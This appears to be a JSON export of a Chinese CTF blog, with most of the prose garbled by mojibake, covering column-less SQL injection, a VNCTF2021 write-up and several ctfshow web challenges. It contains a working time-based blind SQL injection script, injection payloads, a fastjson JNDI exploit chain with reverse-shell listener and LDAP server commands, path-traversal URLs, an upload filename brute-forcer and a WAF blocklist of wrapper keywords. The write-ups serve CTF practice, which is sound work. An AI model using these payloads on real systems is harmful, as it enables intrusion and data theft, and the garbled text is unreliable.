æ¡ä»¶ï¼šç›²æ³¨çš„æ¡ä»¶\nä¸Šé¢ä¸¤ç§æ–¹æ³•è¦ä¹ˆéœ€è¦æŠ¥é”™ï¼Œè¦ä¹ˆéœ€è¦å›æ˜¾ï¼Œé‚£ä¹ˆç›²æ³¨çš„æ¡ä»¶ä¸‹å’‹åŠå‘¢ï¼Œåœ¨çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥å…ˆselectå‡ºæƒ³è¦çš„å†…å®¹ï¼Œç„¶åå†æ„é€ ä¸€ä¸ªå†…å®¹ä¸å…¶æ¯”è¾ƒï¼Œä½œä¸ºç›²æ³¨æ—¶åˆ¤æ–­çš„æ¡ä»¶ã€‚\nä¾‹å¦‚ï¼šselect * from users limit 1;å¾—åˆ°ï¼š\næˆ‘ä»¬å¯ä»¥æ„é€ select 1,0,0;\nç„¶åä¸å…¶æ¯”è¾ƒï¼šselect (select ((select 1,0,0)\u0026gt;(select * from users limit 1)));\nç»“æœä¸ºfalseï¼Œè¯´æ˜1ä¸å¤§äºç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼\næ¥ç€ï¼šselect (select ((select 2,0,0)\u0026gt;(select * from users limit 1)));\nç»“æœä¸ºtrueï¼Œè¯´æ˜2å¤§äºç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ï¼Œç»“åˆä¸Šé¢çš„å¯ä»¥çŸ¥é“ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ä¸º1ã€‚å‰©ä¸‹çš„ä»¥æ­¤ç±»æ¨ã€‚\nå½“æˆ‘å‡†å¤‡æ¥ç€æ³¨ä¸‹å»çš„æ—¶å€™ï¼Œå‘ç°æŠ¥é”™äº†ï¼š\nä»”ç»†å’Œç½‘ä¸Šçš„æ–‡ç« å¯¹ç…§äº†ä¸€ä¸‹ï¼Œå‘ç°payloadæ²¡æœ‰é—®é¢˜ï¼ŒçŒœæµ‹æ˜¯æ•°æ®åº“ç‰ˆæœ¬çš„é—®é¢˜ï¼Œç°åœ¨ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯5.5ï¼š\næŠ±ç€æ€€ç–‘çš„å¿ƒæ€æ¢äº†ä¸ª5.7çš„mysqlï¼Œç„¶åé¡ºä¾¿åˆ›å»ºäº†ä¸€ä¸ªtestè¡¨ï¼š\nç„¶åç»§ç»­å°è¯•åˆšåˆšçš„payloadï¼šselect ((select 1,\u0026quot;f\u0026quot;)\u0026gt;(select * from test limit 1));\nå‘ç°å¯è¡Œï¼Œåº”è¯¥æ˜¯æŸä¸ªç‰ˆæœ¬ä¹‹åè¿™ä¸¤è€…å¯ä»¥è¿›è¡Œæ¯”è¾ƒï¼Œä½†æ˜¯å…·ä½“å“ªä¸ªç‰ˆæœ¬æ²¡æœ‰è¿›è¡Œå°è¯•ï¼ˆåˆæ‡’åˆèœï¼‰ï¼ŒçŸ¥é“çš„å¸ˆå‚…å¯ä»¥å’Œæˆ‘è¯´ä¸€ä¸‹ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nåœ¨æ•°æ®åº“ä¸­æ“ä½œå®Œä¹‹åå¼€å§‹å¤ç›˜ã€‚\né¦–å…ˆæˆ‘ä»¬å¾—çŸ¥é“è¡¨åï¼Œè¿™ä¸ªä¸Šè¾¹è®²è¿‡äº†ï¼›å…¶æ¬¡æ˜¯å¾—çŸ¥é“è¿™å¼ è¡¨ä¸­æœ‰å¤šå°‘ä¸ªå­—æ®µï¼Œè¿™ä¸ªæˆ‘è®¤ä¸ºå¯ä»¥é€šè¿‡order byæ¥ç¡®å®šï¼š\nç„¶åå¾—çŸ¥é“æœ‰å¤šå°‘è¡Œï¼Œå½“å¤§äºä¸€è¡Œçš„æ—¶å€™å¾—åŠ ä¸Šlimitä¸ç„¶ä¼šæŠ¥é”™ï¼Œæ°¸è¿œéƒ½è¿”å›falseï¼Œè¿™ä¸ªåªèƒ½é å°è¯•å’ŒçŒœæµ‹å§ã€‚ã€‚ã€‚ä¸è¿‡flagè¡¨ä¸€èˆ¬å°±ä¸€è¡Œ\nç„¶åå°±å¯ä»¥è¿›è¡Œç›²æ³¨äº†ï¼š\n1 2 ?id=1\u0026#39; and ((select \u0026#39;1\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ ?id=1\u0026#39; and ((select \u0026#39;2\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ ç»“æœï¼š\nå››ã€order byç›²æ³¨ å¥½åƒæ²¡ä»€ä¹ˆåˆé€‚çš„ç¯å¢ƒï¼Œç­‰ä¸‹å›é‡åˆ°å†å¡«å‘å§ï¼Œå…ˆè´´ä¸ªé“¾æ¥ï¼šä¸€é“é¢˜å¼•å‘çš„æ— åˆ—åæ³¨å…¥ | ChaBugå®‰å…¨\næœ€å æˆ‘çš„æ•°æ®åº“åŸºç¡€ä¸æ‰å®ï¼Œå¦‚æœæœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹è¿˜å¸Œæœ›å¸ˆå‚…ä»¬å¤šå¤šåŒ…æ¶µï¼Œå¦‚æœèƒ½å’Œæˆ‘äº¤æµï¼ŒæŒ‡å‡ºæˆ‘çš„é”™è¯¯å°±æ›´å¥½å•¦\nå‚è€ƒï¼š\nèŠä¸€èŠbypass information_schema - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)\ninformationè¢«bançš„æƒ…å†µä¸‹è¿›è¡ŒSQLæ³¨å…¥ - Cl4y\u0026rsquo;s SecretCl4y\u0026rsquo;s Secret\næ— åˆ—åæ³¨å…¥æ€»ç»“_D1stinyçš„åšå®¢-CSDNåšå®¢_æ— åˆ—åæ³¨å…¥\n","date":"2021-05-19T22:10:17+08:00","permalink":"https://k1te.cn/p/ctf%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/","title":"ctfæ— åˆ—åæ³¨å…¥å°ç»“"},{"content":"Ezgame åœ¨ç½‘ä¸Šæ‰¾åˆ°è¿™ä¸ªæ¸¸æˆçš„æºç ï¼Œç„¶ååœ¨game.jsä¸­æœç´¢winå…³é”®è¯ï¼Œå‘ç°å½“winTimer.IsSet()è¿”å›Trueæ—¶ï¼Œæ¸¸æˆèƒœåˆ©ã€‚\nç„¶ååœ¨å…¶ä»–æ–‡ä»¶é‡Œæ‰¾æ‰¾ï¼Œå°±å¯ä»¥åœ¨gameEngine.jsä¸­æ‰¾åˆ°Timerç±»çš„isSetæ–¹æ³•ï¼š\nIsSet() { return this.endTime \u0026gt; 0; }\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°è¾“å…¥ï¼šwinTimer.endTime = 1\nç„¶è€Œï¼Œæœ‰å¤§ä½¬ç›´æ¥ä»ç½‘ç«™æºç ä¸­è§£å‡ºäº†flagï¼š\nåœ¨æºç é‡Œé¢æ‰¾åˆ°äº†ä¸€å †å¥‡æ€ªçš„ä¸œè¥¿ï¼š\nä¸¢åˆ°ä¸€ä¸ªåœ¨çº¿åŠ å¯†ç½‘ç«™ï¼Œè§£å¯†å¾—åˆ°flagï¼š\ntql\nï¼ˆåŸæ¥ç›´æ¥ä¸¢åˆ°æ§åˆ¶å°å›è½¦å°±å‡ºæ¥äº†ã€‚ã€‚ã€‚\nrealezjvav[å¤ç°] ç¬¬ä¸€å…³æ˜¯ä¸€ä¸ªç¬›å¡å°”ç§¯æ³¨å…¥ï¼Œå…¶å®å½“æ—¶fuzzå‡ºæ¥ä¹‹åå‘ç°sleep benchmark RLIKE get_lockéƒ½è¢«banäº†ï¼Œåªå‰©ç¬›å¡å°”ç§¯äº†ï¼Œå¥ˆä½•è¿˜æ˜¯å¤ªèœäº†ï¼Œä¸€ç›´æ²¡åŠæ³•å»¶æ—¶ï¼Œæœ€ååˆè·‘å»æƒ³æ˜¯ä¸æ˜¯åˆ«çš„æ–¹å‘ã€‚ã€‚ã€‚\nè‡ªå·±å†™çš„è„šæœ¬ï¼šï¼ˆæœ¬æ¥æƒ³ç”¨ä¸‰ä¸ªtableçš„ç»„åˆï¼Œä¼šå»¶æ—¶1så·¦å³ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æœ‰æ—¶å€™æ­£å¸¸çš„è¯·æ±‚ä¼šæœ‰5sçš„å»¶æ—¶ï¼Œæ‰€ä»¥æ”¹ç”¨ä¸¤ä¸ªtableåŠ ä¸€ä¸ªcolumnï¼Œè¿™æ ·å¤§æ¦‚ä¼šæœ‰13ç§’å·¦å³çš„å»¶æ—¶ï¼Œç„¶åæ—¶å·®\u0026gt;10så³å¯ï¼›time.sleep(0.1)æ˜¯æ€•buuçš„å®¹å™¨429Too Many Requestsï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import time url = \u0026#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login\u0026#34; ans = \u0026#34;\u0026#34; for i in range(1, 100): flag = 1 for j in range(31,127): # passwordï¼šno_0ne_kn0w_th1s payload = \u0026#34;1\u0026#39; and if(ascii(substr(password,\u0026#34;+ str(i) +\u0026#34;,1))\u0026gt;\u0026#34;+ str(j) +\u0026#34;,0,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C))#\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: payload} res = requests.post(url=url, data=data) time.sleep(0.1) # print(payload) print(res.elapsed.total_seconds()) # print(res.status_code) if res.status_code != 200: print(\u0026#34;error \u0026#34;+str(res.status_code)) break if res.elapsed.total_seconds() \u0026gt; 10: if (j != 31): ans += chr(j) flag = 0 break else: break if (flag == 0): print(ans) else: break ç™»å½•è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªå¤´åƒé€‰æ‹©é¡µé¢ï¼Œæœ‰ä¸€ä¸ªåˆ›æ·è§’è‰²åŠŸèƒ½ï¼ŒburpæŠ“åŒ…ï¼Œä¼ çš„æ˜¯jsonæ•°æ®ï¼š\nç„¶åå‘ç°å›¾ç‰‡çš„æ˜¾ç¤ºæ˜¯æ ¹æ®ï¼š/searchimage?img=2.pngï¼Œå°è¯•è¯»å–flagï¼Œä½†æ˜¯å¹¶ä¸è¡Œï¼Œå› ä¸ºå¯¹javaé¡¹ç›®çš„ç›®å½•ç»“æ„ä¸æ¸…æ¥šï¼Œæ‰€ä»¥å•¥ä¹Ÿè¯»ä¸åˆ°ï¼Œwpé‡Œé¢è¯»å–äº†../../../../../pom.xmlï¼Œå¹¶ä¸”åœ¨é‡Œé¢æ‰¾åˆ°äº†fastjsonä¾èµ–ï¼š\nç„¶åæ ¹æ®çº¢é˜Ÿæ­¦å™¨åº“:fastjsonå°äº1.2.68å…¨æ¼æ´RCEåˆ©ç”¨expè¿™ç¯‡æ–‡ç« è¿›è¡Œå¤ç°ã€‚\næ„é€ æ¶æ„javaç±»å¹¶èµ·ä¸€ä¸ªhttpæœåŠ¡ è¿™é‡Œç”¨åˆ°äº†34566 34567 34568ä¸‰ä¸ªç«¯å£ï¼Œ34566æ˜¯æˆ‘ä»¬åå¼¹shellçš„ç›‘å¬ç«¯å£ï¼Œå†™åœ¨Exploit.javaé‡Œé¢ï¼ˆæŠŠå®˜æ–¹wpçš„ipæ”¹æˆè‡ªå·±çš„vpsï¼Œç«¯å£æ”¹æˆ34566ï¼‰ï¼›34567æ˜¯æ¶æ„javaç±»çš„ç«¯å£ï¼Œå…ˆä½¿ç”¨javac Exploit.javaç”ŸæˆExploit.classï¼Œç„¶åä½¿ç”¨python3 -m http.server 34567èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼š\nç„¶åå†æµè§ˆå™¨ä¸­è¾“å…¥IPåœ°å€å’Œç«¯å£34567çœ‹çœ‹æœ‰æ²¡æœ‰å¼€èµ·æ¥ï¼š\nå¦‚æœæ²¡æœ‰ï¼Œå¾—æŠŠvpsé˜²ç«å¢™ä¸­ç›¸åº”çš„ç«¯å£æ‰“å¼€ã€‚\nå¼€å¯LDAPæœåŠ¡ 34568æ˜¯ldapæœåŠ¡çš„ç«¯å£\ngit clone https://hub.fastgit.org/mbechler/marshalsec.git\nç„¶åcd marshalsec\næ¥ç€buildï¼ˆå¯èƒ½éœ€è¦å…ˆsudo apt install mavenï¼‰ï¼š\nmvn clean package -DskipTests\nç­‰å¾…ä¸€æ®µæ—¶é—´å®Œæˆä¹‹åä¼šç”Ÿæˆä¸€ä¸ªtargetç›®å½•ï¼Œcd target\nç„¶årunï¼š\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx:34567/#Exploit 34568\næœ€ånc -lvvp 34566ç›‘å¬æˆ‘ä»¬åå¼¹shellçš„ç«¯å£\nç”¨payloadæ”»å‡»é¢˜ç›®æœåŠ¡å™¨ åœ¨åˆšåˆšæŠ“åŒ…å‘é€jsonæ•°æ®çš„åœ°æ–¹æŠŠæˆ‘ä»¬çš„payloadå‘é€è¿‡å»ï¼ˆä½¿ç”¨Unicodeç¼–ç ï¼‰ï¼š\nç„¶ååå¼¹shellæˆåŠŸï¼Œcatå³å¯æ‹¿åˆ°flagï¼š\n","date":"2021-03-14T01:47:24+08:00","permalink":"https://k1te.cn/p/vnctf2021/","title":"VNCTF2021"},{"content":"å¤§å‰å¤§åˆ©æ¯webéƒ¨åˆ†wp èœç‚¸äº†ï¼Œä¸€éƒ¨åˆ†é¢˜æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œä¸€éƒ¨åˆ†é¢˜æ˜¯çœ‹wpå¤ç°çš„\nspaceman phpä»£ç å®¡è®¡ï¼Œæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class spaceman { public $username; public $password; public function __construct($username,$password) { $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } public function __wakeup() { if($this-\u0026gt;password===\u0026#39;ctfshowvip\u0026#39;) { include(\u0026#34;flag.php\u0026#34;); echo $flag; } else { echo \u0026#39;wrong password\u0026#39;; } } } function filter($string){ return str_replace(\u0026#39;ctfshowup\u0026#39;,\u0026#39;ctfshow\u0026#39;,$string); } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\_|\\.|\\]|\\[/is\u0026#39;,$str)){ die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } $ser = filter(serialize(new spaceman($user_name,$pass_word))); $test = unserialize($ser); ?\u0026gt; php://input ä¸ $_POST å…ˆè¯´è¯´php://inputä¼ å‚çš„é—®é¢˜ï¼Œå½“ç›´æ¥poststr=xxxxçš„æ—¶å€™å¯ä»¥ç›´æ¥ä¼ å…¥å˜é‡strï¼Œä½†æ˜¯å½“poststr=xxx\u0026amp;pass_word=xxxçš„æ—¶å€™ï¼Œphp://inputä¼šå°†è¿™ä¸€æ•´ä¸²èµ‹å€¼ç»™strï¼Œå› ä¸ºå…¶ä¸­æœ‰ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æ— æ³•ç»•è¿‡ï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š\nä¸Šç½‘æŸ¥æ‰¾ç›¸å…³èµ„æ–™ï¼Œå‘ç°ï¼š\n1 2 3 1.Coentent-Typeä»…åœ¨å–å€¼ä¸ºapplication/x-www-data-urlencodedå’Œmultipart/form-dataä¸¤ç§æƒ…å†µä¸‹ï¼ŒPHPæ‰ä¼šå°†httpè¯·æ±‚æ•°æ®åŒ…ä¸­ç›¸åº”çš„æ•°æ®å¡«å…¥å…¨å±€å˜é‡$_POST 2.åªæœ‰Coentent-Typeä¸ºmultipart/form-dataçš„æ—¶å€™ï¼ŒPHPä¸ä¼šå°†httpè¯·æ±‚æ•°æ®åŒ…ä¸­çš„ç›¸åº”æ•°æ®å¡«å…¥php://inputï¼Œå¦åˆ™å…¶å®ƒæƒ…å†µéƒ½ä¼šã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒCoentent-Typeä¸ºmultipart/form-dataæ—¶ï¼Œphp://inputä¸ºç©ºè€Œ$_POSTä¸ä¸ºç©ºï¼Œä»è€Œç»•è¿‡è¯¥æ­£åˆ™ã€‚è‡³äºå¦‚ä½•ä¼ å‘¢ï¼Œæˆ‘æ˜¯ä½¿ç”¨æ’ä»¶Tabbed Postman - REST Clientï¼Œå…¶ä»–çš„æ–¹æ³•æˆ‘ä¹Ÿä¸ä¼šï¼ˆèœï¼‰\nååºåˆ—åŒ– åˆšå¼€å§‹è§‰å¾—filterå‡½æ•°åæ‰äº†ä¿©å­—ç¬¦ï¼Œä¼šå¯¼è‡´ååºåˆ—æ— æ³•æ­£å¸¸è¿›è¡Œï¼Œåé¢å‘ç°ï¼Œè¿™ä¸ªfilterå‡½æ•°è¿‡æ»¤äº†ä¸ªå¯‚å¯ã€‚ã€‚ã€‚\næ­£å¸¸æƒ…å†µä¸‹å‹æ ¹å„¿å°±æ²¡æœ‰ctfshowupç»™ä»–è¿›è¡Œæ›¿æ¢ã€‚ã€‚ã€‚æ‰€ä»¥ç›´æ¥ä»¥form-dataï¼Œpostä¸€ä¸ªpass_word=ctfshowvipå³å¯ï¼Œuser_nameéšä¾¿å¡«\nå¯èƒ½æ˜¯å‡ºé¢˜æ²¡æƒ³åˆ°è¿™ä¸ªéé¢„æœŸå§\nveryphp ä¹Ÿæ˜¯ä¸€é“phpä»£ç å®¡è®¡ï¼Œæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); include(\u0026#34;config.php\u0026#34;); class qwq { function __wakeup(){ die(\u0026#34;Access Denied!\u0026#34;); } static function oao(){ show_source(\u0026#34;config.php\u0026#34;); } } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\\u0026#39;|\\\u0026#34;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is\u0026#39;,$str)){ die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } if(isset($shaw_root)){ if(preg_match(\u0026#39;/^\\-[a-e][^a-zA-Z0-8]\u0026lt;b\u0026gt;(.*)\u0026gt;{4}\\D*?(abc.*?)p(hp)*\\@R(s|r).$/\u0026#39;, $shaw_root)\u0026amp;\u0026amp; strlen($shaw_root)===29){ echo $hint; }else{ echo \u0026#34;Almost there.\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Input correct parameters\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; die(); } if($ans===$SecretNumber){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Congratulations!\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; call_user_func($my_ans); } php://input ä¸ $_POST ä¼ å‚é—®é¢˜ä¸ä¸Šä¸€é¢˜ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚\næ­£åˆ™ ç»•äº†åŠå¤©ä¸çŸ¥é“è¿™ä¸ªæ­£åˆ™æƒ³åŒ¹é…äº›å•¥ï¼ˆå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œä¸è¿‡æœ€åæ€»ç®—æ˜¯ç»•è¿‡å»äº†ï¼Œå­¦ä¹ æ­£åˆ™çš„è¯å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šæ­£åˆ™è¡¨è¾¾å¼30åˆ†é’Ÿå…¥é—¨æ•™ç¨‹ï¼Œæœ€åç»™å‡º$shaw_rootçš„å€¼ï¼š-a9\u0026lt;b\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;abcaaaaaaaa.php@Rr.ã€‚\n$SecretNumber ç»•è¿‡æ­£åˆ™ä¹‹åå¾—åˆ°ä¸€ä¸ªhintï¼šHere is a hint : md5(\u0026quot;shaw\u0026quot;.($SecretNumber).\u0026quot;root\u0026quot;)==166b47a5cb1ca2431a0edfcef200684f \u0026amp;\u0026amp; strlen($SecretNumber)===5ï¼Œæ„Ÿè§‰å‡ºé¢˜äººæ˜¯æƒ³è®©æˆ‘ä»¬æ ¹æ®è¿™ä¸ªhintæŠŠSecretNumberçˆ†å‡ºæ¥ï¼Œä½†æ˜¯è¿™é‡Œä¸¤ä¸ªå˜é‡éƒ½å¯æ§ï¼Œåº”è¯¥æ˜¯è¢«éé¢„æœŸäº†ã€‚ã€‚ã€‚\ncall_user_func åˆæ˜¯ä¸€ä¸ªå˜é‡çš„call_user_funcã€‚ã€‚ã€‚ä¸Šå›æˆ‘ç›¯ç€phpinfoçœ‹äº†å¤§åŠå¤©ã€‚ã€‚ã€‚è¿™æ¬¡ä¹Ÿæ˜¯å…ˆä¼ å…¥ä¸€ä¸ªphpinfoæ‰¾æ‰¾ï¼Œä½†æ˜¯å¹¶æ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„ä¸œè¥¿ï¼Œç„¶ååˆæœäº†ä¸‹flagï¼Œä¹Ÿæ²¡æ‰¾åˆ°ã€‚ç„¶åè¿™æ—¶å€™æƒ³èµ·æœ€å‰é¢çš„qwqç±»ä»¥åŠå…¶é™æ€æ–¹æ³•ï¼Œåˆšå¼€å§‹ç›´æ¥ä¼ å…¥my_ans=oaoï¼Œä½†æ˜¯å‘ç°è¡Œä¸é€šã€‚ã€‚ã€‚äºæ˜¯å»Googleäº†ä¸€ä¸‹call_user_funcå¦‚ä½•è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•ï¼š\nå› ä¸ºoaoå‡½æ•°æ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥ä¼ å…¥my_ansæ•°ç»„ä»è€Œè°ƒç”¨è¯¥é™æ€æ–¹æ³•ï¼Œæœ€åpayloadï¼š\nè™å±±è¡Œ\u0026amp;revenge è¿™é¢˜çœŸçš„ä¸ä¼šï¼Œä¹‹å‰ä¹Ÿæ²¡æœ‰åšè¿‡pharçš„ååºåˆ—åŒ–ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯é ç€å„ç§wpå’Œèµ„æ–™å¤ç°çš„ã€‚\næ‰“å¼€ä¹‹åæœ‰ä¸ªhintï¼š\nè®¿é—®ä¹‹åï¼š\nå®‰è£…çœ‹çœ‹ï¼š\nå‡è£…è‡ªå·±æ‰«äº†ä¸€ä¸‹ç›®å½•ï¼š\næ‹¿åˆ°æºç ä¹‹åå…ˆæ‹¿dç›¾æ‰«ä¸€ä¸‹ï¼š\nå¥½åƒæ²¡å•¥ç”¨ï¼Œåé¢åŒå­¦å’Œæˆ‘è¯´å¯ä»¥ä¼ fileç›´æ¥ç›®å½•ç©¿è¶Šï¼ˆå®¡è®¡æºç èƒ½åŠ›å¤ªå·®äº†ï¼‰ï¼š\nç„¶åæ‰“å¼€ï¼š/ctfshowsecretfilehhï¼š\nåˆ©ç”¨/mc-admin/page-edit.php?file=../../../../../../../var/www/html/ctfshowsecretfilehh/waf.phpè¯»å–waf.phpæºç :\n1 2 3 4 5 6 7 8 \u0026lt;?php function waf($file){ if (preg_match(\u0026#34;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\\.\\.\\//i\u0026#34;,$file)){ die(\u0026#34;å§¿åŠ¿å¤ªç®€å•å•¦ï¼Œæ¥ä¸€ç‚¹éªšçš„ï¼Ÿï¼\u0026#34;); }else{ return $file; } } å†ç”¨/mc-admin/page-edit.php?file=../../../upload.phpè¯»å–upload.phpçš„æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); // å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€ $allowedExts = array(\u0026#34;gif\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); // echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;]; $extension = end($temp); // è·å–æ–‡ä»¶åç¼€å if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048000) // å°äº 2000kb \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;æ–‡ä»¶å‡ºé”™: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34; æ–‡ä»¶å·²ç»å­˜åœ¨ã€‚ \u0026#34;; } else { $md5_unix_random =substr(md5(time()),0,8); $filename = $md5_unix_random.\u0026#39;.\u0026#39;.$extension; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34; . $filename); echo \u0026#34;ä¸Šä¼ æˆåŠŸ,æ–‡ä»¶å­˜åœ¨upload/\u0026#34;; } } } else { echo \u0026#34;æ–‡ä»¶ç±»å‹ä»…æ”¯æŒjpgã€pngã€gifç­‰å›¾ç‰‡æ ¼å¼\u0026#34;; } ?\u0026gt; è¿™é‡Œç›´æ¥å‚è€ƒyu22xå¸ˆå‚…åšå®¢é‡Œçš„è„šæœ¬æ‰¾ä¸Šä¼ çš„æ–‡ä»¶å\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import time import hashlib def geturl(s): a=hashlib.md5(str(int(s)).encode()).hexdigest() return \u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload/\u0026#34;+a[:8]+\u0026#39;.gif\u0026#39; #coding:utf-8 while True: url=\u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload.php\u0026#34; files={\u0026#39;file\u0026#39;:(\u0026#39;exp.gif\u0026#39;, open(\u0026#39;exp.gif\u0026#39;,\u0026#39;rb\u0026#39;), \u0026#39;image/gif\u0026#39; )} r=requests.post(url,files=files) print(r.text) a=time.time() r2=requests.get(geturl(a)) r3=requests.get(geturl(a-1))#å­˜åœ¨å»¶æ—¶å¤šè¯•å‡ ä¸ªæ—¶é—´ if(\u0026#34;æˆ‘çš„ç½‘ç«™\u0026#34; not in r2.text or \u0026#34;æˆ‘çš„ç½‘ç«™\u0026#34; not in r3.text): print(geturl(a)) print(geturl(a-1)) break else: time.sleep(0.3) å…ˆåœ¨/uplaodä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ï¼ˆåç¼€åå·²æ”¹ä¸ºgifï¼‰ï¼Œç„¶åå†ç”¨è¯¥è„šæœ¬æ‰¾æ–‡ä»¶åï¼š\nç„¶åè®¿é—®hint.txt:\nè®¿é—®/ctfshowgetflaghhhhï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php show_source(__FILE__); $unser = $_GET[\u0026#39;unser\u0026#39;]; class Unser { public $username=\u0026#39;Firebasky\u0026#39;; public $password; function __destruct() { if($this-\u0026gt;username==\u0026#39;ctfshow\u0026#39;\u0026amp;\u0026amp;$this-\u0026gt;password==(int)md5(time())){ system(\u0026#39;cp /ctfshow* /var/www/html/flag.txt\u0026#39;); } } } $ctf=@unserialize($unser); system(\u0026#39;rm -rf /var/www/html/flag.txt\u0026#39;); å› ä¸ºmd5ä¹‹åæœ‰ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥å½“mdå€¼æ˜¯å­—æ¯å¼€å¤´çš„æ—¶å€™ä¼šå˜æˆ0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¤passwordä¸º0ï¼Œç„¶åå¤šè¯•å‡ æ¬¡æ—¢å¯ï¼š\nåé¢æœ‰ä¸ªsystem('rm -rf /var/www/html/flag.txt');åˆ æ‰flagï¼Œç†è®ºä¸Šéœ€è¦æ¡ä»¶ç«äº‰ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ç‹‚ç‚¹äº†å‡ æ¬¡hackbarçš„EXECUTEä¹‹åå°±å¯ä»¥ç›´æ¥urlè®¿é—®ã€‚ã€‚ã€‚ã€‚è¿·\nrevengeåªæœ‰è·¯ç”±çš„åå­—ä¸ä¸€æ 